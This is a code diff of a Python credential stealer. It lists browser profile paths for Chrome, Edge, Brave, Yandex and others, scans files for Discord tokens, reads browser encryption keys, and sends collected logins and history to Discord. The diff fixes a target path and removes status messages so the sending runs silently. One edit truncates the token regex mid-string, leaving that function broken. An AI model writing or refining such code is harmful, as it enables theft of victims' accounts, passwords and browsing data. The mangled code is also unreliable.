@@ -51,7 +51,7 @@ PATHS = {
     'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
     'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
     'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
-    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
     'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
     'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
     'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
@@ -83,12 +83,7 @@ def gettokens(path):
         try:
             with open(f"{path}{file}", "r", errors="ignore") as f:
                 for line in (x.strip() for x in f.readlines()):
-                    for values in re.findall(r"dQw4w9WgXcQ:[^.*$'(.*)'$.*$][^\"]*", line):
-                        tokens.append(values)
-        except PermissionError:
-            continue
-
-    return tokens
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*
 
 def getkey(path):
     with open(path + f"\\Local State", "r") as file:
@@ -431,7 +426,4 @@ if __name__ == "__main__":
         collect_browser_logins(browser)
         history = get_browser_history(browser, limit=100)
         status = send_history_to_discord(history, browser)
-        if status == 200:
-            print(f"History for {browser} sent to Discord successfully.")
-        else:
-            print(f"Failed to send history for {browser} to Discord. Status code: {status}")
+        # Removed print statements here
